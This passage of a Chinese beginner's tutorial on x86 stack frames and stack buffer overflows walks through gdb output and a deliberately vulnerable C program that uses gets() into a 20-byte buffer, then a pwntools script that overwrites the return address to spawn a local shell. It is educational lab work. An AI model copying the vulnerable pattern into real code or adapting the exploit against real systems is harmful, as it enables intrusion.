函数调用压栈顺序</h4><blockquote><ol type="1"><li>调用者压入需要保存的寄存器(通常这些寄存器包括 EAX，ECX 和 EDX等)</li><li>按照从右往左的顺序压入参数(这个可能有特殊情况, 详情请看<a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a>)</li><li>返回地址</li><li>调用者的 EBP</li><li>局部变量</li><li>被调用者本身压入需要保存的寄存器， 通常这些寄存器包括 EBX，ESI 和 EDI 等</li></ol></blockquote><ol type="1"><li><p>被调用函数(callee)的<strong>参数</strong>按照<strong>逆序</strong>依次压入栈内. 如果callee没有参数, 则无需此操作. 这些参数仍会保存在调用函数(caller)的函数状态内, 之后压入栈内的数据都会作为被调用函数(callee)的函数状态来保存.</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/v2-9125ba203edd2bab1308ad88db2ae197_hd.jpg" alt="img"><figcaption>img</figcaption></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   0x8048552 &lt;main+68&gt;        add    esp, 0x10</span><br><span class="line">   0x8048555 &lt;main+71&gt;        mov    eax, DWORD PTR [ebp-0x18]</span><br><span class="line">   0x8048558 &lt;main+74&gt;        sub    esp, 0x8</span><br><span class="line">→  0x804855b &lt;main+77&gt;        push   eax# $eax : 0x17(即:23,自己输入的数据)</span><br><span class="line">   0x804855c &lt;main+78&gt;        push   DWORD PTR [ebp-0x14] # ebp为main函数栈基址,-0x14便是int a的栈地址,此处是压入a的值到calc调用栈</span><br><span class="line">   0x804855f &lt;main+81&gt;        call   0x80484eb &lt;calc&gt;</span><br><span class="line">   0x8048564 &lt;main+86&gt;        add    esp, 0x10</span><br><span class="line">   0x8048567 &lt;main+89&gt;        mov    DWORD PTR [ebp-0x10], eax</span><br><span class="line">   0x804856a &lt;main+92&gt;        sub    esp, 0x8</span><br></pre></td></tr></table></figure><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/1538817009439.png" alt="1538817009439"><figcaption>1538817009439</figcaption></figure></li><li><p>然后将调用函数(caller)进行调用之后的<strong>下一条指令地址作为返回地址压入栈内</strong>. 这样调用函数(caller)的eip(指令)信息得以保存.(这一操作是隐式的, 在执行call命令时就已经push了return的值了)</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.jpg" alt="img"><figcaption>img</figcaption></figure><p>在gdb里<code>step into</code>进<code>calc</code>函数, 当执行到<code>push ebp</code>的时候, 能看到前面的两个参数和返回地址已经被push到当前函数(即<code>calc</code>)的栈帧, 如下图:</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/1538825556293.png" alt="1538825556293"><figcaption>1538825556293</figcaption></figure></li><li><p>再将当前的<strong>ebp寄存器的值(也就是调用函数[caller]的基地址)压入栈</strong>内, 并将<strong>ebp寄存器的值更新为当前栈顶(esp)的地址</strong>. 这样调用函数(caller)的ebp(基地址)信息得以保存. 同时, ebp被更新为被调用函数(callee)的基地址. 例如下面调用calc函数时, 有<code>mov rbp, rsp</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    0x4006b1 &lt;main+61&gt;        dec    DWORD PTR [rbx+0x458bec55]</span><br><span class="line">    0x4006b7 &lt;main+67&gt;        lock   mov esi, edx</span><br><span class="line">    0x4006ba &lt;main+70&gt;        mov    edi, eax</span><br><span class="line">→   0x4006bc &lt;main+72&gt;        call   0x400646 &lt;calc&gt;</span><br><span class="line">  ↳    0x400646 &lt;calc+0&gt;         push   rbp</span><br><span class="line">       0x400647 &lt;calc+1&gt;         mov    rbp, rsp</span><br><span class="line">       0x40064a &lt;calc+4&gt;         mov    DWORD PTR [rbp-0x14], edi</span><br><span class="line">       0x40064d &lt;calc+7&gt;         mov    DWORD PTR [rbp-0x18], esi</span><br><span class="line">       0x400650 &lt;calc+10&gt;        mov    DWORD PTR [rbp-0x8], 0x0</span><br><span class="line">       0x400657 &lt;calc+17&gt;        mov    DWORD PTR [rbp-0x4], 0x2</span><br></pre></td></tr></table></figure><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/v2-c350a4c5e9f5bbe839606486f3100185_hd.jpg" alt="img"><figcaption>img</figcaption></figure><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/1538826215949.png" alt="1538826215949"><figcaption>1538826215949</figcaption></figure></li><li><p>再之后将<strong>被调用函数(callee)的局部变量等数据压入栈</strong>内.</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/v2-63f07378642e6f38197ddfb817567f6c_hd.jpg" alt="img"><figcaption>img</figcaption></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   0x80484ec &lt;calc+1&gt;         mov    ebp, esp</span><br><span class="line">   0x80484ee &lt;calc+3&gt;         sub    esp, 0x10</span><br><span class="line">   0x80484f1 &lt;calc+6&gt;         mov    DWORD PTR [ebp-0x8], 0x2 # 给d赋值: d=2</span><br><span class="line">→  0x80484f8 &lt;calc+13&gt;        mov    eax, DWORD PTR [ebp+0x8] # 将参数a=5赋给eax</span><br><span class="line">   0x80484fb &lt;calc+16&gt;        imul   eax, DWORD PTR [ebp-0x8] # 5*2(有符号乘)</span><br><span class="line">   0x80484ff &lt;calc+20&gt;        mov    edx, eax</span><br><span class="line">   0x8048501 &lt;calc+22&gt;        mov    eax, DWORD PTR [ebp+0xc]</span><br><span class="line">   0x8048504 &lt;calc+25&gt;        add    eax, edx # 10 + 23</span><br><span class="line">   0x8048506 &lt;calc+27&gt;        mov    DWORD PTR [ebp-0x4], eax # 赋值给变量c</span><br></pre></td></tr></table></figure></li></ol><h4 id="函数调用出栈顺序">(2) 函数调用出栈顺序</h4><ol type="1"><li><p>栈顶(ESP)会重新指向被调用函数(callee)的基地址, 因此, 被调用函数的局部变量会从站内直接弹出. 如下: <img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/v2-4340d6c750f59519f4f87dffca03a86a_hd.jpg" alt="img"></p><p>具体汇编代码是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   0x8048505 &lt;calc+26&gt;        ror    BYTE PTR [ecx+0x458bfc45], 1</span><br><span class="line">   0x804850b &lt;calc+32&gt;        cld    </span><br><span class="line">   0x804850c &lt;calc+33&gt;        leave  </span><br><span class="line">→  0x804850d &lt;calc+34&gt;        ret    </span><br><span class="line">  ↳   0x8048564 &lt;main+86&gt;        add    esp, 0x10</span><br><span class="line">      0x8048567 &lt;main+89&gt;        mov    DWORD PTR [ebp-0x10], eax</span><br><span class="line">      0x804856a &lt;main+92&gt;        sub    esp, 0x8</span><br><span class="line">      0x804856d &lt;main+95&gt;        push   DWORD PTR [ebp-0x10]</span><br><span class="line">      0x8048570 &lt;main+98&gt;        push   0x804863a</span><br><span class="line">      0x8048575 &lt;main+103&gt;       call   0x8048390 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure><p>如上图, 当执行到<code>calc</code>函数的<code>ret</code>返回语句时, 会有下面一系列的语句, 其中第一条<code>add</code>语句就是让<code>esp</code>重新指向<code>calc</code>的基址(ebp)的关键语句, 此时位于低地址的局部变量将丢弃.</p></li><li><p>随后将基地址内存储的调用函数(caller)的ebp的值重新pop到当前的ebp中, 至此, 调用函数(caller)的基地址得以恢复. 值得注意的是, 这一操作是隐式的(与函数调用压栈的第2步作对比). 如下图:</p><ul><li><p>执行<code>leave</code>前: <img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/1538829057155.png" alt="1538829057155"></p></li><li><p>执行<code>leave</code>后: <img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/1538829148474.png" alt="1538829148474"></p></li><li><p><code>esp</code>存储的地址会指向返回地址(<code>0x08048564</code>): <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$eax   : 0x21      </span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0x1       </span><br><span class="line">$edx   : 0xa       </span><br><span class="line">$esp   : 0xffffcf5c  →  0x08048564  →  &lt;main+86&gt; add esp, 0x10 # 指向ret地址</span><br><span class="line">$ebp   : 0xffffcf88  →  0x00000000</span><br><span class="line">$esi   : 0xf7faf000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7faf000  →  0x001b1db0</span><br><span class="line">$eip   : 0x804850d   →  &lt;calc+34&gt; ret </span><br><span class="line">$eflags: [carry PARITY ADJUST zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$gs: 0x0063  $fs: 0x0000  $ds: 0x002b  $cs: 0x0023  $es: 0x002b  $ss: 0x002b</span><br></pre></td></tr></table></figure></p></li></ul></li><li><p>然后将返回地址从栈内pop出来, 并存到<code>eip</code>内. 从而调用函数(caller)的<code>eip</code>信息得以恢复, 指向下一条指令. <img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/1538830059726.png" alt="1538830059726"></p></li></ol><blockquote><p>总结一下上面的调用压栈和出栈:</p><p>(1)压栈时, 先压参数, 后压返回地址, 然后再将caller的<code>ebp</code>压入, 最后将局部变量压入.</p><p>(2)出栈时, 先弹局部变量, 后弹ebp, 然后通过返回地址恢复<code>eip</code>.</p><p>通过上述描述, 可知函数调用压栈和出栈是一个互逆过程, 这也间接验证了堆栈平衡的机理.</p></blockquote><hr><h3 id="x14-寄存器分布">0x14 寄存器分布</h3><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/register.png" alt="img"><figcaption>img</figcaption></figure><blockquote><p>32位和64位程序的部分区别:</p><ul><li>x86<ul><li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li></ul></li><li>x64<ul><li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)中前六个整型或指针参数依次保存在<strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li></ul></li></ul></blockquote><hr><h2 id="x20-栈溢出原理">0x20 栈溢出原理</h2><p>栈溢出的原理其实很简单: <strong>在程序没有判断输入长度的情况下, 当程序向申请的变量写入的字节长度超过了该变量向内存申请的字节长度, 因而导致该变量相邻的栈的内存的值被覆盖.</strong> 简而言之, 还是开篇提及的两个栈溢出条件. 由于操作系统或者程序增加了对栈溢出的保护, 而使得溢出的难度增大, 但其核心思想是不变的. 我们先用根据下图来看看溢出的效果:</p><ol type="1"><li><p>在执行漏洞函数之前, 我们能看到<code>ebp</code> <code>esp</code>的地址很正常, ebp的下一个地址也指向了<code>return address</code>.</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/1538897713778.png" alt="1538897713778"><figcaption>1538897713778</figcaption></figure></li><li><p>接着当我们执行到漏洞函数之时, 输入以下字符串:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808</span><br></pre></td></tr></table></figure></li><li><p>我们再看看此时的堆栈:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line"><span class="variable">$eax</span>   : 0x25      </span><br><span class="line"><span class="variable">$ebx</span>   : 0x0       </span><br><span class="line"><span class="variable">$ecx</span>   : 0xffffffff</span><br><span class="line"><span class="variable">$edx</span>   : 0xf7fae870  →  0x00000000</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffcf30  →  0xf7fad300  →  0xf7f56447  →  <span class="string">"ISO-10646/UCS2/"</span></span><br><span class="line"><span class="variable">$ebp</span>   : 0x33333333 (<span class="string">"3333"</span>?)</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7fad000  →  0x001b1db0</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7fad000  →  0x001b1db0</span><br><span class="line"><span class="variable">$eip</span>   : 0x38303830 (<span class="string">"0808"</span>?)</span><br><span class="line"><span class="variable">$eflags</span>: [carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$gs</span>: 0x0063  <span class="variable">$ds</span>: 0x002b  <span class="variable">$cs</span>: 0x0023  <span class="variable">$es</span>: 0x002b  <span class="variable">$fs</span>: 0x0000  <span class="variable">$ss</span>: 0x002b</span><br></pre></td></tr></table></figure><p>不难看出, 此时的<code>ebp</code>被覆盖为<code>0x33333333</code> ,<code>eip</code>被覆盖为<code>0x38303830</code>. 至此, 栈溢出完美实现!</p></li></ol><hr><h2 id="x30-栈溢出实战-小试牛刀">0x30 栈溢出实战-小试牛刀</h2><p>首先, 先写一个有漏洞的脚本程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">&gt; File Name: stack-overflow-demo.c</span></span><br><span class="line"><span class="comment">&gt; Author: killshadow</span></span><br><span class="line"><span class="comment">&gt; Mail: chaceli@foxmail.com</span></span><br><span class="line"><span class="comment">&gt; Created Time: 2018年10月07日 星期日 13时02分34秒</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Congratulations! You have already get shell!\n"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerablefunc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">20</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    vulnerablefunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序中, <code>exec()</code>可以执行shell命令, 但是没有在主函数执行; <code>vulnerablefunc()</code>执行了一个没有判断输入字符串长度的<code>gets</code>函数, 该函数是一个危险函数(不判断输入字符串的长度), 编译时也能看得出来:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  demo gcc -m32 -fno-stack-protector stack-overflow-demo.c -o stack-overflow-demo</span><br><span class="line">stack-overflow-demo.c: In <span class="keyword">function</span> ‘<span class="built_in">exec</span>’:</span><br><span class="line">stack-overflow-demo.c:13:5: warning: implicit declaration of <span class="keyword">function</span> ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">     system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">     ^</span><br><span class="line">stack-overflow-demo.c: In <span class="keyword">function</span> ‘vulnerablefunc’:</span><br><span class="line">stack-overflow-demo.c:18:5: warning: implicit declaration of <span class="keyword">function</span> ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">     gets(s);</span><br><span class="line">     ^</span><br><span class="line">/tmp/ccA0jCUY.o: In <span class="keyword">function</span> `vulnerablefunc<span class="string">':</span></span><br><span class="line"><span class="string">stack-overflow-demo.c:(.text+0x37): warning: the `gets'</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure><p>上面编译有两个warning: 1)第一个warning提示危险的<code>system</code>函数(系统调用); 2)第二个warning就是<code>gets</code>函数了. 该命令中, <code>-fno-stack-protectotor</code>表示不开启堆栈溢出保护(不生成canary). 同时, 还可以关闭地址随机化PIE(Position Independent Executable), 如果<code>gcc -v</code>后能看到<code>--enable-default-pie</code>即为开启了PIE. 我们在编译时, 添加<code>-no-pie</code>参数即可关闭PIE.</p><p>此时我们在shell下反汇编<code>objdump -d stack-overflow-demo</code>:(截取部分汇编)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">0804846b &lt;exec&gt;:</span><br><span class="line"> 804846b:55                   push   %ebp</span><br><span class="line"> 804846c:89 e5                mov    %esp,%ebp</span><br><span class="line"> 804846e:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048471:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048474:68 60 85 04 08       push   $0x8048560</span><br><span class="line"> 8048479:e8 b2 fe ff ff       call   8048330 &lt;puts@plt&gt;</span><br><span class="line"> 804847e:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048481:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048484:68 8d 85 04 08       push   $0x804858d</span><br><span class="line"> 8048489:e8 b2 fe ff ff       call   8048340 &lt;system@plt&gt;</span><br><span class="line"> 804848e:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048491:90                   nop</span><br><span class="line"> 8048492:c9                   leave  </span><br><span class="line"> 8048493:c3                   ret    </span><br><span class="line"></span><br><span class="line">08048494 &lt;vulnerablefunc&gt;:</span><br><span class="line"> 8048494:55                   push   %ebp</span><br><span class="line"> 8048495:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048497:83 ec 28             sub    $0x28,%esp</span><br><span class="line"> 804849a:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 804849d:8d 45 e4             lea    -0x1c(%ebp),%eax # ebp-0x1c即为s的地址</span><br><span class="line"> 80484a0:50                   push   %eax</span><br><span class="line"> 80484a1:e8 7a fe ff ff       call   8048320 &lt;gets@plt&gt; # 这里调用gets函数</span><br><span class="line"> 80484a6:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 80484a9:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 80484ac:8d 45 e4             lea    -0x1c(%ebp),%eax</span><br><span class="line"> 80484af:50                   push   %eax</span><br><span class="line"> 80484b0:e8 7b fe ff ff       call   8048330 &lt;puts@plt&gt;</span><br><span class="line"> 80484b5:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 80484b8:90                   nop</span><br><span class="line"> 80484b9:c9                   leave  </span><br><span class="line"> 80484ba:c3                   ret    </span><br><span class="line"></span><br><span class="line">080484bb &lt;main&gt;:</span><br><span class="line"> 80484bb:8d 4c 24 04          lea    0x4(%esp),%ecx</span><br><span class="line"> 80484bf:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line"> 80484c2:ff 71 fc             pushl  -0x4(%ecx)</span><br><span class="line"> 80484c5:55                   push   %ebp</span><br><span class="line"> 80484c6:89 e5                mov    %esp,%ebp</span><br><span class="line"> 80484c8:51                   push   %ecx</span><br><span class="line"> 80484c9:83 ec 04             sub    $0x4,%esp</span><br><span class="line"> 80484cc:e8 c3 ff ff ff       call   8048494 &lt;vulnerablefunc&gt;</span><br><span class="line"> 80484d1:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line"> 80484d6:83 c4 04             add    $0x4,%esp</span><br><span class="line"> 80484d9:59                   pop    %ecx</span><br><span class="line"> 80484da:5d                   pop    %ebp</span><br><span class="line"> 80484db:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line"> 80484de:c3                   ret    </span><br><span class="line"> 80484df:90                   nop</span><br></pre></td></tr></table></figure><p>执行<code>gets</code>函数之前, <code>vulnerablefunc</code>的栈帧为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        High</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Return Address   |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Caller&apos;s ebp     |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+ &lt;------+ ebp</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|   Local Variables   |</span><br><span class="line">|    (char s[20])     |</span><br><span class="line">+---------------------+ &lt;------+ s, [ebp-0x1c]</span><br><span class="line">          Low</span><br></pre></td></tr></table></figure><p><code>gets</code>函数执行后, <code>vulnerablefunc</code>的栈帧为:(输入: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        High</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Return Address   |</span><br><span class="line">|    (0x38303830)     |</span><br><span class="line">+---------------------+</span><br><span class="line">|                     |</span><br><span class="line">|    Caller&apos;s ebp     |</span><br><span class="line">|    (0x33333333)     |</span><br><span class="line">+---------------------+ &lt;------+ ebp</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|   Local Variables   |</span><br><span class="line">|      (aaaa...)      |</span><br><span class="line">+---------------------+ &lt;-------+ s, [ebp-0x1c]</span><br><span class="line">        Low</span><br></pre></td></tr></table></figure><p>这里的<code>0x1c</code>是<code>char</code>型变量<code>s</code>与<code>ebp</code>的相对地址, 所以要覆盖<code>ebp</code>, 就需要构造<code>0x1c</code>个字节的payload, 后面四个字节是<code>ebp</code>的地址, 紧接着<code>ebp</code>的后面四个字节的地址便是返回地址. 因此, 如果要覆盖返回地址, 让函数弹出栈帧时弹到自己想要返回到的函数地址, 就需要先找到<strong>需要利用的函数的地址</strong>, 然后将这个地址加进payload里, 如下所示代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># open this elf executable file</span></span><br><span class="line">sh = process(<span class="string">'./stack-overflow-demo'</span>)</span><br><span class="line"><span class="comment"># objdump -d stack-overflow-demo, you can find "exec" function's address</span></span><br><span class="line">exec_addr = <span class="number">0x0804846B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x1c is offset address from ebp, [ebp - 0x1c] is "s" address</span></span><br><span class="line"><span class="comment"># "aaaa" can cover ebp value</span></span><br><span class="line"><span class="comment"># return address had changed exec_addr</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x1c</span> + <span class="string">"aaaa"</span> + p32(exec_addr)</span><br><span class="line"><span class="comment"># print small end address</span></span><br><span class="line"><span class="keyword">print</span> p32(exec_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload into process</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># get interactive shell</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行该脚本之后, 可以获得shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  demo python stack-overflow-demo-attack.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./stack-overflow-demo'</span>: pid 20109</span><br><span class="line">k\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak\x84\x0</span><br><span class="line">Congratulations! You have already get shell!</span><br><span class="line">$ uname -a</span><br><span class="line">Linux ks 4.15.0-36-generic <span class="comment">#39~16.04.1-Ubuntu SMP Tue Sep 25 08:59:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>至此, 你的第一个栈溢出攻击的过程就完美实现啦! Keep Moving!!!</p><hr><h2 id="x40-参考链接">0x40 参考链接</h2><blockquote><p>部分内容引自如下blog, 如有侵权立即更改本文.</p></blockquote><p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/" target="_blank" 